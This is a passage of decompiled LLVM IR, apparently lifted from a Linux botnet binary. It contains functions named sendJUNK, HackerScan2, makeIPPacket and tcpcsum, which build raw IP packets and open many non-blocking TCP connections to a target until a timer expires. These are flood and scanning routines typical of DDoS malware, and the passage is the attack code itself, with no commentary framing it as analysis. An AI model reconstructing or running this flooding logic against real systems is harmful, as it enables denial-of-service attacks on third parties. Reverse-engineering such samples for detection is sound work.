  %v6_804ebf7 = add i32 %v0_804ebf4, -12
  %v7_804ebf7 = inttoptr i32 %v6_804ebf7 to i32*
  store i32 %v1_804e824, i32* %v7_804ebf7, align 4
  %v5_804ebfa = add i32 %v0_804ebf4, -16
  %v6_804ebfa = inttoptr i32 %v5_804ebfa to i32*
  store i32 %v2_804e80c, i32* %v6_804ebfa, align 4
  %v0_804ebfd = call i32 @tcpcsum()
  %v1_804ebfd = trunc i32 %v0_804ebfd to i16
  %sext18 = mul i32 %v0_804ebfd, 65536
  %v1_804ec05 = sdiv i32 %sext18, 65536
  store i32 %v1_804ec05, i32* %edx.global-to-local, align 4
  store i16 %v1_804ebfd, i16* %v2_804eae6, align 4
  store i32 %v2_804e80c, i32* %eax.global-to-local, align 4
  %v3_804ec11 = load i16, i16* %v2_804eb46, align 2
  %v4_804ec11 = zext i16 %v3_804ec11 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804ec11, i32* %edx.global-to-local, align 4
  store i32 %v2_804e80c, i32* %eax.global-to-local, align 4
  %v1_804ec20 = load i32, i32* @esp, align 4
  %v2_804ec20 = add i32 %v1_804ec20, -4
  %v3_804ec20 = inttoptr i32 %v2_804ec20 to i32*
  store i32 %v4_804ec11, i32* %v3_804ec20, align 4
  %v0_804ec21 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ec21 = add i32 %v1_804ec20, -8
  %v3_804ec21 = inttoptr i32 %v2_804ec21 to i32*
  store i32 %v0_804ec21, i32* %v3_804ec21, align 4
  %v1_804ec22 = load i32, i32* %stack_var_-64, align 4
  %v2_804ec22 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804ec22 = call i32 @csum(i16* %v2_804ec22, i32 %v1_804ec22)
  %v4_804ec22 = trunc i32 %v3_804ec22 to i16
  %sext19 = mul i32 %v3_804ec22, 65536
  %v1_804ec2a = sdiv i32 %sext19, 65536
  store i32 %v1_804ec2a, i32* %edx.global-to-local, align 4
  store i32 %v2_804e80c, i32* %eax.global-to-local, align 4
  store i16 %v4_804ec22, i16* %v4_804eb64, align 2
  store i32 %arg7, i32* @edi, align 4
  %v10_804ec36 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804ec36, i1* %cf.global-to-local, align 1
  %v15_804ec36 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804ec39 = icmp eq i1 %v15_804ec36, false
  br i1 %v1_804ec39, label %dec_label_pc_804ec59, label %dec_label_pc_804ec3b

dec_label_pc_804ec3b:                             ; preds = %dec_label_pc_804eb84
  %v0_804ec3b = load i32, i32* @esp, align 4
  %v5_804ec3b = icmp ult i32 %v0_804ec3b, 12
  store i1 %v5_804ec3b, i1* %cf.global-to-local, align 1
  %v1_804ec3e = add i32 %v0_804ec3b, -16
  %v2_804ec3e = inttoptr i32 %v1_804ec3e to i32*
  store i32 0, i32* %v2_804ec3e, align 4
  %v1_804ec40 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804ec40 = call i32 @__GI_time(i32* %v1_804ec40)
  store i32 %v2_804ec40, i32* %eax.global-to-local, align 4
  %v0_804ec45 = load i32, i32* @esp, align 4
  %v1_804ec45 = add i32 %v0_804ec45, 16
  %v10_804ec48 = icmp ult i32 %v2_804ec40, %v5_804eb75
  store i1 %v10_804ec48, i1* %cf.global-to-local, align 1
  %v8_804ec4b = icmp sgt i32 %v2_804ec40, %v5_804eb75
  br i1 %v8_804ec4b, label %dec_label_pc_804ec61, label %dec_label_pc_804eb84

dec_label_pc_804ec59:                             ; preds = %dec_label_pc_804eb84
  %v4_804ec59 = add i32 %stack_var_-68.0, 1
  %v0_804eb8a.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eb84

dec_label_pc_804ec61:                             ; preds = %dec_label_pc_804ec3b, %dec_label_pc_804e720, %dec_label_pc_804e7a9, %dec_label_pc_804e76b
  %v0_804ec6b = phi i32 [ %v4_804e72d, %dec_label_pc_804e720 ], [ %v3_804e7b7, %dec_label_pc_804e7a9 ], [ %v3_804e779, %dec_label_pc_804e76b ], [ %v2_804ec40, %dec_label_pc_804ec3b ]
  store i32 %v0_804e6df, i32* @ebx, align 4
  store i32 %v0_804e6de, i32* @esi, align 4
  ret i32 %v0_804ec6b

; uselistorder directives
  uselistorder i32 %v2_804ec40, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ebe3, { 1, 0 }
  uselistorder i32 %v1_804ebc8, { 1, 0 }
  uselistorder i32 %v0_804ebb3, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_804eb8a, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804eb75, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804eb6d, { 1, 0 }
  uselistorder i32 %v1_804eb57, { 1, 0 }
  uselistorder i32 %v1_804eb09, { 1, 0 }
  uselistorder i32 %v1_804eada, { 1, 0 }
  uselistorder i32 %v3_804eac0, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i32 %v1_804ea95, { 1, 0 }
  uselistorder i1 %v0_804ea7c, { 1, 0 }
  uselistorder i32 %v6_804ea7a, { 1, 0 }
  uselistorder i32 %v1_804ea42, { 1, 0 }
  uselistorder i1 %v0_804ea29, { 1, 0 }
  uselistorder i32 %v6_804ea27, { 1, 0 }
  uselistorder i32 %v1_804e9ec, { 1, 0 }
  uselistorder i1 %v0_804e9d3, { 1, 0 }
  uselistorder i32 %v6_804e9d1, { 1, 0 }
  uselistorder i32 %v1_804e9a2, { 1, 0 }
  uselistorder i1 %v0_804e989, { 1, 0 }
  uselistorder i32 %v6_804e987, { 1, 0 }
  uselistorder i32 %v1_804e95e, { 1, 0 }
  uselistorder i1 %v0_804e945, { 1, 0 }
  uselistorder i32 %v6_804e943, { 1, 0 }
  uselistorder i32 %v4_804e925, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10 }
  uselistorder i32 %stack_var_-160.130, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-156.131, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804eaa5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804ea92, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i32 %v1_804e8fe, { 1, 0 }
  uselistorder i32 %v1_804e8f2, { 1, 0 }
  uselistorder i32 %v1_804e8e6, { 1, 0 }
  uselistorder i32 %v1_804e8da, { 1, 0 }
  uselistorder i32 %v1_804e8ce, { 1, 0 }
  uselistorder i8* %v2_804e8cb, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804e8b5, { 1, 0 }
  uselistorder i32 %v6_804e8b3, { 1, 0 }
  uselistorder i32 %v1_804e867, { 1, 0 }
  uselistorder i32 %v0_804e849, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804e824, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_804e80c, { 13, 12, 11, 10, 9, 8, 7, 25, 24, 23, 6, 5, 22, 4, 3, 21, 20, 19, 18, 26, 17, 16, 15, 14, 2, 1, 0 }
  uselistorder i32 %v2_804e801, { 1, 0, 2 }
  uselistorder i32 %v2_804e7e2, { 1, 0 }
  uselistorder i32 %v1_804e70b, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-60, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 35, 17, 18, 19, 20, 21, 23, 22, 24, 26, 25, 27, 29, 28, 30, 32, 31, 33, 34, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 3, 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec61, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804eb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804eb1e, { 1, 0 }
  uselistorder label %dec_label_pc_804eab6, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804e925, { 1, 0 }
  uselistorder label %dec_label_pc_804e7e9, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %dec_label_pc_804e720, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804ec6f = load i32, i32* @edi, align 4
  %v0_804ec70 = load i32, i32* @ebx, align 4
  store i32 %v0_804ec70, i32* %stack_var_-12, align 4
  %v12_804ec71 = ptrtoint i32* %stack_var_-220 to i32
  store i32 %v12_804ec71, i32* %eax.global-to-local, align 4
  %v1_804ec7f = call i32 @getdtablesize(i32 %v12_804ec71)
  store i32 %v1_804ec7f, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804ec7f, 0
  %v2_804ec88 = zext i1 %tmp to i32
  %v2_804ec8b = add i32 %v2_804ec88, %v1_804ec7f
  %v2_804ec8d = sdiv i32 %v2_804ec8b, 2
  store i32 2, i32* %stack_var_-60, align 4
  %v1_804ec9b = urem i32 %arg2, 65536
  store i32 %v1_804ec9b, i32* %eax.global-to-local, align 4
  %v1_804eca4 = call i32 @htons(i32 %v1_804ec9b)
  %v2_804ecb3 = ptrtoint i32* %stack_var_-60 to i32
  %v15_804ecb6 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804ecb6, i32* %eax.global-to-local, align 4
  %v3_804ecbd = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804ecbd, i32* %eax.global-to-local, align 4
  %v1_804ecc5 = icmp eq i32 %v3_804ecbd, 0
  br i1 %v1_804ecc5, label %dec_label_pc_804ecce, label %dec_label_pc_804f00a

dec_label_pc_804ecce:                             ; preds = %entry
  %v2_804ece4 = mul i32 %v2_804ec8d, 8
  %v1_804ecea = add i32 %v2_804ece4, 30
  %v2_804eced = and i32 %v1_804ecea, -16
  %v2_804ecf3 = sub i32 %v12_804ec71, %v2_804eced
  %v1_804ed01 = add i32 %v2_804ecf3, 15
  %v2_804ed04 = and i32 %v1_804ed01, -16
  %v2_804ed21 = mul i32 %v2_804ec8d, 5
  store i32 %v2_804ed21, i32* %edx.global-to-local, align 4
  %v1_804ed27 = inttoptr i32 %v2_804ed04 to i8*
  store i32 %v2_804ed04, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804ed2c = and i32 %v1_804ed01, -256
  store i32 %v1_804ed2c, i32* %eax.global-to-local, align 4
  %v5_804ed2e = call i8* @_memset(i8* %v1_804ed27, i32 %v1_804ed2c, i32 %v2_804ed21)
  %v0_804ed30 = load i32, i32* @esp, align 4
  %v1_804ed33 = add i32 %v0_804ed30, -16
  %v2_804ed33 = inttoptr i32 %v1_804ed33 to i32*
  store i32 1024, i32* %v2_804ed33, align 4
  %v1_804ed38 = call i32 @malloc(i32 %v2_804ed04)
  %v0_804ed3d = load i32, i32* @esp, align 4
  store i32 %v1_804ed38, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804ed50 = add i32 %v0_804ed3d, 8
  %v3_804ed50 = inttoptr i32 %v2_804ed50 to i32*
  store i32 1024, i32* %v3_804ed50, align 4
  %v1_804ed51 = add i32 %v0_804ed3d, 4
  %v2_804ed51 = inttoptr i32 %v1_804ed51 to i32*
  store i32 0, i32* %v2_804ed51, align 4
  %v0_804ed53 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ed53 = inttoptr i32 %v0_804ed3d to i32*
  store i32 %v0_804ed53, i32* %v3_804ed53, align 4
  %v3_804ed54 = inttoptr i32 %v1_804ed38 to i8*
  %v4_804ed54 = call i32 @__GI_memset(i8* %v3_804ed54, i32 %tmp9, i32 %tmp6)
  store i32 %v4_804ed54, i32* %eax.global-to-local, align 4
  %v0_804ed59 = load i32, i32* @esp, align 4
  %v2_804ed5f = inttoptr i32 %v0_804ed59 to i32*
  store i32 0, i32* %v2_804ed5f, align 4
  %v1_804ed61 = inttoptr i32 %v1_804ed38 to i32*
  %v2_804ed61 = call i32 @__GI_time(i32* %v1_804ed61)
  %v0_804ed66 = load i32, i32* @esp, align 4
  %v1_804ed66 = add i32 %v0_804ed66, 16
  %v5_804ed69 = add i32 %v2_804ed61, %arg3
  store i32 %v5_804ed69, i32* %eax.global-to-local, align 4
  %v3_804ed86 = or i32 %v2_804ed04, 4
  %v2_804ee71 = ptrtoint i32* %stack_var_-188 to i32
  %tmp35 = bitcast i32* %stack_var_-188 to i8*
  %v2_804eec5 = ptrtoint i32* %stack_var_-196 to i32
  %v2_804eeff = ptrtoint i32* %stack_var_-200 to i32
  %v2_804ef06 = ptrtoint i32* %stack_var_-204 to i32
  %v5_804efee38 = icmp sgt i32 %v2_804ec8b, 1
  br label %dec_label_pc_804eff4

dec_label_pc_804ed80:                             ; preds = %dec_label_pc_804efe8.preheader, %dec_label_pc_804efe5
  %storemerge40 = phi i32 [ %v4_804efe5, %dec_label_pc_804efe5 ], [ 0, %dec_label_pc_804efe8.preheader ]
  %stack_var_-192.139 = phi i32 [ %stack_var_-192.0, %dec_label_pc_804efe5 ], [ %stack_var_-192.2, %dec_label_pc_804efe8.preheader ]
  store i32 %storemerge40, i32* %eax.global-to-local, align 4
  store i32 %v2_804ed04, i32* %edx.global-to-local, align 4
  %v2_804ed86 = mul i32 %storemerge40, 8
  %v4_804ed86 = add i32 %v2_804ed86, %v3_804ed86
  %v5_804ed86 = inttoptr i32 %v4_804ed86 to i8*
  %v6_804ed86 = load i8, i8* %v5_804ed86, align 4
  %v7_804ed86 = zext i8 %v6_804ed86 to i32
  %v9_804ed86 = and i32 %storemerge40, -256
  %v10_804ed86 = or i32 %v7_804ed86, %v9_804ed86
  store i32 %v10_804ed86, i32* %eax.global-to-local, align 4
  store i32 %v7_804ed86, i32* %edx.global-to-local, align 4
  %v8_804ed97 = icmp eq i8 %v6_804ed86, 0
  %v12_804ed97 = icmp eq i8 %v6_804ed86, 1
  br i1 %v12_804ed97, label %dec_label_pc_804ee67, label %dec_label_pc_804eda4

dec_label_pc_804eda4:                             ; preds = %dec_label_pc_804ed80
  %v12_804eda4 = icmp eq i8 %v6_804ed86, 2
  br i1 %v12_804eda4, label %dec_label_pc_804ef85, label %dec_label_pc_804edb1

dec_label_pc_804edb1:                             ; preds = %dec_label_pc_804eda4
  br i1 %v8_804ed97, label %dec_label_pc_804edbf, label %dec_label_pc_804efe5

dec_label_pc_804edbf:                             ; preds = %dec_label_pc_804edb1
  store i32 %storemerge40, i32* @ebx, align 4
  %v0_804edc2 = load i32, i32* @esp, align 4
  %v1_804edc5 = add i32 %v0_804edc2, -8
  %v2_804edc5 = inttoptr i32 %v1_804edc5 to i32*
  store i32 0, i32* %v2_804edc5, align 4
  %v1_804edc7 = add i32 %v0_804edc2, -12
  %v2_804edc7 = inttoptr i32 %v1_804edc7 to i32*
  store i32 1, i32* %v2_804edc7, align 4
  %v1_804edc9 = add i32 %v0_804edc2, -16
  %v2_804edc9 = inttoptr i32 %v1_804edc9 to i32*
  store i32 2, i32* %v2_804edc9, align 4
  %v2_804edcb = load i32, i32* %stack_var_-204, align 4
  %v3_804edcb = call i32 @socket(i32 %v7_804ed86, i32 %v12_804ec71, i32 %v2_804edcb)
  %v2_804edd8 = load i32, i32* @ebx, align 4
  %v3_804edd8 = mul i32 %v2_804edd8, 8
  %v4_804edd8 = add i32 %v3_804edd8, %v2_804ed04
  %v5_804edd8 = inttoptr i32 %v4_804edd8 to i32*
  store i32 %v3_804edcb, i32* %v5_804edd8, align 8
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v3_804ede1 = add i32 %v2_804ed86, %v2_804ed04
  %v4_804ede1 = inttoptr i32 %v3_804ede1 to i32*
  %v5_804ede1 = load i32, i32* %v4_804ede1, align 8
  store i32 %v5_804ede1, i32* %eax.global-to-local, align 4
  %v0_804ede4 = load i32, i32* @esp, align 4
  %v1_804ede7 = add i32 %v0_804ede4, -8
  %v2_804ede7 = inttoptr i32 %v1_804ede7 to i32*
  store i32 0, i32* %v2_804ede7, align 4
  %v1_804ede9 = add i32 %v0_804ede4, -12
  %v2_804ede9 = inttoptr i32 %v1_804ede9 to i32*
  store i32 3, i32* %v2_804ede9, align 4
  %v0_804edeb = load i32, i32* %eax.global-to-local, align 4
  %v2_804edeb = add i32 %v0_804ede4, -16
  %v3_804edeb = inttoptr i32 %v2_804edeb to i32*
  store i32 %v0_804edeb, i32* %v3_804edeb, align 4
  %v2_804edec = load i32, i32* %stack_var_-204, align 4
  %v3_804edec = call i32 @__libc_fcntl(i32 %v7_804ed86, i32 %v12_804ec71, i32 %v2_804edec)
  %v0_804edf1 = load i32, i32* @esp, align 4
  %v12_804edf6 = or i32 %v3_804edec, 2048
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v5_804edff = load i32, i32* %v4_804ede1, align 8
  store i32 %v5_804edff, i32* %eax.global-to-local, align 4
  %v2_804ee05 = add i32 %v0_804edf1, 8
  %v3_804ee05 = inttoptr i32 %v2_804ee05 to i32*
  store i32 %v12_804edf6, i32* %v3_804ee05, align 4
  %v1_804ee06 = add i32 %v0_804edf1, 4
  %v2_804ee06 = inttoptr i32 %v1_804ee06 to i32*
  store i32 4, i32* %v2_804ee06, align 4
  %v0_804ee08 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ee08 = inttoptr i32 %v0_804edf1 to i32*
  store i32 %v0_804ee08, i32* %v3_804ee08, align 4
  %v2_804ee09 = load i32, i32* %stack_var_-204, align 4
  %v3_804ee09 = call i32 @__libc_fcntl(i32 %v7_804ed86, i32 %v12_804ec71, i32 %v2_804ee09)
  %v0_804ee0e = load i32, i32* @esp, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v5_804ee1a = load i32, i32* %v4_804ede1, align 8
  store i32 %v5_804ee1a, i32* %eax.global-to-local, align 4
  %v1_804ee20 = add i32 %v0_804ee0e, 8
  %v2_804ee20 = inttoptr i32 %v1_804ee20 to i32*
  store i32 16, i32* %v2_804ee20, align 4
  %v2_804ee22 = add i32 %v0_804ee0e, 4
  %v3_804ee22 = inttoptr i32 %v2_804ee22 to i32*
  store i32 %v2_804ecb3, i32* %v3_804ee22, align 4
  %v0_804ee23 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ee23 = inttoptr i32 %v0_804ee0e to i32*
  store i32 %v0_804ee23, i32* %v3_804ee23, align 4
  %v2_804ee24 = load i32, i32* %stack_var_-204, align 4
  %v3_804ee24 = call i32 @__libc_connect(i32 %v7_804ed86, i32 %v12_804ec71, i32 %v2_804ee24)
  store i32 %v3_804ee24, i32* %eax.global-to-local, align 4
  %v0_804ee29 = load i32, i32* @esp, align 4
  %v1_804ee29 = add i32 %v0_804ee29, 16
  %v10_804ee2c = icmp eq i32 %v3_804ee24, -1
  %v1_804ee2f = icmp eq i1 %v10_804ee2c, false
  br i1 %v1_804ee2f, label %dec_label_pc_804ee3d, label %dec_label_pc_804ee31

dec_label_pc_804ee31:                             ; preds = %dec_label_pc_804edbf
  %v1_804ee31 = call i32 @__errno_location(i32 %v7_804ed86)
  store i32 %v1_804ee31, i32* %eax.global-to-local, align 4
  %v1_804ee36 = inttoptr i32 %v1_804ee31 to i32*
  %v2_804ee36 = load i32, i32* %v1_804ee36, align 4
  store i32 %v2_804ee36, i32* %eax.global-to-local, align 4
  %v9_804ee38 = icmp eq i32 %v2_804ee36, 115
  br i1 %v9_804ee38, label %dec_label_pc_804ee57, label %dec_label_pc_804ee31.dec_label_pc_804ee3d_crit_edge

dec_label_pc_804ee31.dec_label_pc_804ee3d_crit_edge: ; preds = %dec_label_pc_804ee31
  %v0_804ee46.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ee3d

dec_label_pc_804ee3d:                             ; preds = %dec_label_pc_804ee31.dec_label_pc_804ee3d_crit_edge, %dec_label_pc_804edbf
  %v0_804ee46 = phi i32 [ %v0_804ee46.pre, %dec_label_pc_804ee31.dec_label_pc_804ee3d_crit_edge ], [ %v1_804ee29, %dec_label_pc_804edbf ]
  store i32 %storemerge40, i32* %eax.global-to-local, align 4
  store i32 %v2_804ed04, i32* %edx.global-to-local, align 4
  %v5_804ee43 = load i32, i32* %v4_804ede1, align 8
  store i32 %v5_804ee43, i32* %eax.global-to-local, align 4
  %v2_804ee49 = add i32 %v0_804ee46, -16
  %v3_804ee49 = inttoptr i32 %v2_804ee49 to i32*
  store i32 %v5_804ee43, i32* %v3_804ee49, align 4
  %v1_804ee4a = call i32 @__libc_close(i32 %v7_804ed86)
  store i32 %v1_804ee4a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804efe5

dec_label_pc_804ee57:                             ; preds = %dec_label_pc_804ee31
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804ed86, align 4
  br label %dec_label_pc_804efe5

dec_label_pc_804ee67:                             ; preds = %dec_label_pc_804ed80
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804ee71, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804ee78 = call i8* @_memset(i8* %tmp35, i32 0, i32 32)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v3_804ee86 = add i32 %v2_804ed86, %v2_804ed04
  %v4_804ee86 = inttoptr i32 %v3_804ee86 to i32*
  %v5_804ee86 = load i32, i32* %v4_804ee86, align 8
  %v2_804ee8b = udiv i32 %v5_804ee86, 32
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v5_804ee94 = load i32, i32* %v4_804ee86, align 8
  %v1_804ee97 = urem i32 %v5_804ee94, 32
  store i32 %v1_804ee97, i32* %eax.global-to-local, align 4
  %v0_804ee9a = load i32, i32* @ebp, align 4
  %v2_804ee9a = mul nuw nsw i32 %v2_804ee8b, 4
  %v3_804ee9a = add nsw i32 %v2_804ee9a, -184
  %v4_804ee9a = add i32 %v3_804ee9a, %v0_804ee9a
  %v5_804ee9a = inttoptr i32 %v4_804ee9a to i32*
  %v6_804ee9a = load i32, i32* %v5_804ee9a, align 4
  %v9_804ee9a = shl i32 1, %v1_804ee97
  %v12_804ee9a = or i32 %v6_804ee9a, %v9_804ee9a
  store i32 %v12_804ee9a, i32* %v5_804ee9a, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v5_804eebc = load i32, i32* %v4_804ee86, align 8
  %v1_804eebf = add i32 %v5_804eebc, 1
  store i32 %v1_804eebf, i32* %edx.global-to-local, align 4
  %v0_804eec2 = load i32, i32* @esp, align 4
  %v2_804eecb = add i32 %v0_804eec2, -16
  %v3_804eecb = inttoptr i32 %v2_804eecb to i32*
  store i32 %v2_804eec5, i32* %v3_804eecb, align 4
  %v1_804eecc = add i32 %v0_804eec2, -20
  %v2_804eecc = inttoptr i32 %v1_804eecc to i32*
  store i32 0, i32* %v2_804eecc, align 4
  store i32 %v2_804ee71, i32* %eax.global-to-local, align 4
  %v2_804eed4 = add i32 %v0_804eec2, -24
  %v3_804eed4 = inttoptr i32 %v2_804eed4 to i32*
  store i32 %v2_804ee71, i32* %v3_804eed4, align 4
  %v1_804eed5 = add i32 %v0_804eec2, -28
  %v2_804eed5 = inttoptr i32 %v1_804eed5 to i32*
  store i32 0, i32* %v2_804eed5, align 4
  %v0_804eed7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804eed7 = add i32 %v0_804eec2, -32
  %v3_804eed7 = inttoptr i32 %v2_804eed7 to i32*
  store i32 %v0_804eed7, i32* %v3_804eed7, align 4
  %v0_804eed8 = load i32, i32* %stack_var_-196, align 4
  %v2_804eed8 = load i32, i32* %stack_var_-188, align 4
  %v5_804eed8 = call i32 @__libc_select(i32 %v0_804eed8, i32 10000, i32 %v2_804eed8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804eed8, i32* %eax.global-to-local, align 4
  %v0_804eedd = load i32, i32* @esp, align 4
  %v12_804eee3 = icmp eq i32 %v5_804eed8, 1
  %v1_804eee7 = icmp eq i1 %v12_804eee3, false
  br i1 %v1_804eee7, label %dec_label_pc_804ef59, label %dec_label_pc_804eee9

dec_label_pc_804eee9:                             ; preds = %dec_label_pc_804ee67
  store i32 4, i32* %stack_var_-200, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  %v5_804eef9 = load i32, i32* %v4_804ee86, align 8
  store i32 %v5_804eef9, i32* %edx.global-to-local, align 4
  %v2_804ef05 = add i32 %v0_804eedd, 16
  %v3_804ef05 = inttoptr i32 %v2_804ef05 to i32*
  store i32 %v2_804eeff, i32* %v3_804ef05, align 4
  store i32 %v2_804ef06, i32* %eax.global-to-local, align 4
  %v2_804ef0c = add i32 %v0_804eedd, 12
  %v3_804ef0c = inttoptr i32 %v2_804ef0c to i32*
  store i32 %v2_804ef06, i32* %v3_804ef0c, align 4
  %v1_804ef0d = add i32 %v0_804eedd, 8
  %v2_804ef0d = inttoptr i32 %v1_804ef0d to i32*
  store i32 4, i32* %v2_804ef0d, align 4
  %v1_804ef0f = add i32 %v0_804eedd, 4
  %v2_804ef0f = inttoptr i32 %v1_804ef0f to i32*
  store i32 1, i32* %v2_804ef0f, align 4
  %v0_804ef11 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ef11 = inttoptr i32 %v0_804eedd to i32*
  store i32 %v0_804ef11, i32* %v3_804ef11, align 4
  %v0_804ef12 = load i32, i32* %stack_var_-200, align 4
  %v1_804ef12 = load i32, i32* %stack_var_-196, align 4
  %v3_804ef12 = load i32, i32* %stack_var_-188, align 4
  %v5_804ef12 = call i32 @getsockopt(i32 %v0_804ef12, i32 %v1_804ef12, i32 10000, i32 %v3_804ef12, i32 ptrtoint (i32* @0 to i32))
  %v0_804ef17 = load i32, i32* @esp, align 4
  %v3_804ef1a = load i32, i32* %stack_var_-204, align 4
  %v1_804ef20 = icmp eq i32 %v3_804ef1a, 0
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  br i1 %v1_804ef20, label %dec_label_pc_804ef49, label %dec_label_pc_804ef24

dec_label_pc_804ef24:                             ; preds = %dec_label_pc_804eee9
  %v5_804ef2a = load i32, i32* %v4_804ee86, align 8
  store i32 %v5_804ef2a, i32* %eax.global-to-local, align 4
  %v2_804ef30 = add i32 %v0_804ef17, 16
  %v3_804ef30 = inttoptr i32 %v2_804ef30 to i32*
  store i32 %v5_804ef2a, i32* %v3_804ef30, align 4
  %v0_804ef31 = load i32, i32* %stack_var_-200, align 4
  %v1_804ef31 = call i32 @__libc_close(i32 %v0_804ef31)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed04, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804ed86, align 4
  br label %dec_label_pc_804efe5

dec_label_pc_804ef49:                             ; preds = %dec_label_pc_804eee9
